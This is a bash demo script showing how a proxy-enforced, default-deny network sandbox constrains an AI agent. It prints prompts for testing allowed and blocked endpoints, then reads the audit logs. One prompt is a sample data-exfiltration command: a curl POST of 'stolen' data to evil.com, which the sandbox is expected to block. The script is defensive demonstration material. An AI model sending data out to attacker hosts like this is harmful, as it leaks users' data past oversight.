#!/usr/bin/env bash
# demo-sandbox-security.sh
#
# Demonstrates OpenShell sandbox network policy enforcement.
#
# How it works: OpenShell places supervised agent processes inside an
# isolated network namespace where the only route out is through the
# proxy at 10.200.0.1:3128. The proxy enforces the policy. This means
# the demo must be run through the agent (OpenClaw) — not via oc exec,
# which bypasses the network namespace.
#
# This script:
#   Phase 1 — Shows the applied policy and prints prompts to type
#   Phase 2 — After the interactive demo, checks audit logs for proof
#
# Prerequisites:
#   - oc logged in and project set
#   - OpenClaw sandbox deployed and gateway running
#   - openclaw-policy.yaml applied to the sandbox
#   - OpenClaw UI open in browser (via 6-open-openclaw.sh)
#
# Optional:
#   NAMESPACE env var (default: current oc project)
#   POD env var (default: auto-detect via app=openclaw label)

set -euo pipefail

# --- Colors ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
DIM='\033[2m'
RESET='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
NAMESPACE="${NAMESPACE:-$(oc project -q 2>/dev/null || echo openshell)}"

# --- Resolve pod name ---
if [ -z "${POD:-}" ]; then
  POD=$(oc get pod -l app=openclaw -n "$NAMESPACE" --no-headers -o custom-columns=":metadata.name" | head -1)
  if [ -z "$POD" ]; then
    echo -e "${RED}ERROR: No pod found with label app=openclaw in namespace $NAMESPACE${RESET}"
    exit 1
  fi
fi

# Strip ANSI escape codes from openshell output
strip_ansi() { sed $'s/\x1b\\[[0-9;]*m//g'; }

# Get the sandbox name for log queries
SANDBOX_NAME=$(openshell sandbox list 2>/dev/null | strip_ansi | grep -v '^NAME' | awk '{print $1}' | head -1 || true)

echo ""
echo -e "${BOLD}============================================${RESET}"
echo -e "${BOLD}  OpenShell Sandbox Security Demo${RESET}"
echo -e "${BOLD}============================================${RESET}"
echo ""
echo -e "Namespace: ${CYAN}$NAMESPACE${RESET}"
echo -e "Pod:       ${CYAN}$POD${RESET}"
echo -e "Sandbox:   ${CYAN}${SANDBOX_NAME:-unknown}${RESET}"
echo ""

# ============================================
# Phase 1: Show the policy
# ============================================
echo -e "${BOLD}${GREEN}=== PHASE 1: The Security Policy ===${RESET}"
echo ""
echo -e "OpenShell enforces ${BOLD}default-deny networking${RESET}. The agent has no"
echo -e "internet access unless the policy explicitly allows it."
echo ""

POLICY_FILE="${SCRIPT_DIR}/openclaw-policy.yaml"
if [ -f "$POLICY_FILE" ]; then
  echo -e "${BOLD}Allowed network endpoints (from openclaw-policy.yaml):${RESET}"
  echo ""
  # Extract and display the allowed hosts
  grep -E "^\s+- host:" "$POLICY_FILE" | sed 's/.*host: /  /' | sort -u
  echo ""
  echo -e "${BOLD}L7 rules (HTTP method restrictions):${RESET}"
  echo ""
  echo -e "  api.github.com — ${GREEN}GET, HEAD, OPTIONS${RESET} only (read-only)"
  echo -e "  github.com     — ${GREEN}GET info/refs, POST git-upload-pack${RESET} only (clone/fetch)"
  echo ""
  echo -e "${DIM}Full policy: cat ${POLICY_FILE}${RESET}"
else
  echo -e "${YELLOW}Policy file not found at $POLICY_FILE${RESET}"
fi

echo ""
echo -e "${BOLD}${CYAN}=== PHASE 2: Interactive Demo ===${RESET}"
echo ""
echo -e "Type these prompts into the OpenClaw UI to test the sandbox boundaries."
echo -e "The agent's processes run inside an isolated network namespace — all"
echo -e "traffic goes through the OpenShell proxy, which enforces the policy."
echo ""

echo -e "${BOLD}--- Test 1: Allowed — fetch from an approved API ---${RESET}"
echo -e "${DIM}The policy allows api.github.com for GET requests.${RESET}"
echo ""
echo -e "  ${CYAN}Prompt:${RESET} Use curl to fetch https://api.github.com/zen and show me the result"
echo ""
echo -e "  ${GREEN}Expected:${RESET} The agent runs curl, gets a GitHub zen quote back."
echo -e "  This proves the allowed endpoint works."
echo ""

echo -e "${BOLD}--- Test 2: Blocked — fetch from an unapproved site ---${RESET}"
echo -e "${DIM}example.com is NOT in the policy. Default-deny blocks it.${RESET}"
echo ""
echo -e "  ${CYAN}Prompt:${RESET} Use curl to fetch https://example.com and show me the response"
echo ""
echo -e "  ${RED}Expected:${RESET} The agent runs curl but gets a 403 or connection error."
echo -e "  The proxy blocks it — the agent cannot reach unapproved hosts."
echo ""

echo -e "${BOLD}--- Test 3: Blocked — another unapproved site ---${RESET}"
echo -e "${DIM}httpbin.org is NOT in the policy.${RESET}"
echo ""
echo -e "  ${CYAN}Prompt:${RESET} Use curl to fetch https://httpbin.org/get"
echo ""
echo -e "  ${RED}Expected:${RESET} Blocked. 403 or connection error from the proxy."
echo ""

echo -e "${BOLD}--- Test 4: L7 enforcement — write to a read-only API ---${RESET}"
echo -e "${DIM}api.github.com allows GET but blocks POST (read-only policy).${RESET}"
echo ""
echo -e "  ${CYAN}Prompt:${RESET} Use curl to POST to https://api.github.com/repos/octocat/hello-world/issues with body {\"title\":\"test\"} and Content-Type application/json. Show the response."
echo ""
echo -e "  ${RED}Expected:${RESET} Blocked. The proxy denies the POST even though the host is allowed."
echo -e "  GET works, POST doesn't — surgical access control."
echo ""

echo -e "${BOLD}--- Test 5: Blocked — data exfiltration attempt ---${RESET}"
echo -e "${DIM}evil.com is NOT in the policy.${RESET}"
echo ""
echo -e "  ${CYAN}Prompt:${RESET} Use curl to send a POST request to https://evil.com/upload with body {\"data\":\"stolen\"}"
echo ""
echo -e "  ${RED}Expected:${RESET} Blocked. Even if the agent is compromised, it cannot"
echo -e "  exfiltrate data to arbitrary hosts."
echo ""

echo -e "${BOLD}============================================${RESET}"
echo ""
echo -e "Run the prompts above in OpenClaw, then press ${BOLD}Enter${RESET} to check the audit logs."
echo ""
read -r -p "Press Enter after completing the interactive demo... "

# ============================================
# Phase 3: Check audit logs
# ============================================
echo ""
echo -e "${BOLD}${CYAN}=== PHASE 3: Audit Trail ===${RESET}"
echo ""
echo -e "Every allow/deny decision is logged. Checking for recent entries..."
echo ""

# Check openshell logs if sandbox name is known
if [ -n "$SANDBOX_NAME" ]; then
  echo -e "${BOLD}Sandbox logs (openshell logs $SANDBOX_NAME):${RESET}"
  echo ""
  openshell logs "$SANDBOX_NAME" --since 10m 2>/dev/null | tail -40 || echo "  (openshell logs not available)"
  echo ""

  echo -e "${BOLD}Deny entries only:${RESET}"
  echo ""
  openshell logs "$SANDBOX_NAME" --level warn --since 10m 2>/dev/null | tail -20 || echo "  (no warn-level entries)"
  echo ""
fi

# Also check pod logs directly
echo -e "${BOLD}Pod logs (deny/blocked entries):${RESET}"
echo ""
oc logs "$POD" -n "$NAMESPACE" --since=10m 2>/dev/null \
  | grep -iE "deny|blocked|DENY|BLOCKED|reject|403" \
  | tail -30 \
  || echo "  (no deny entries found in pod logs)"
echo ""

# Show all recent sandbox logs for context
echo -e "${BOLD}Recent pod logs (all, last 30 lines):${RESET}"
echo ""
oc logs "$POD" -n "$NAMESPACE" --since=10m 2>/dev/null | tail -30 || echo "  (no pod logs)"
echo ""

# ============================================
# Summary
# ============================================
echo -e "${BOLD}============================================${RESET}"
echo -e "${BOLD}  What Was Demonstrated${RESET}"
echo -e "${BOLD}============================================${RESET}"
echo ""
echo -e "  1. ${GREEN}Default-deny${RESET}   — nothing gets out unless the policy says so"
echo -e "  2. ${GREEN}Allowed traffic${RESET} — policy permits OpenAI, GitHub (read), Telegram"
echo -e "  3. ${RED}Blocked traffic${RESET} — unapproved hosts get 403 from the proxy"
echo -e "  4. ${YELLOW}L7 enforcement${RESET}  — even on allowed hosts, only permitted HTTP methods work"
echo -e "  5. ${CYAN}Audit trail${RESET}     — every decision is logged for compliance"
echo ""
echo -e "  ${BOLD}The agent has exactly the access it needs — nothing more.${RESET}"
echo ""
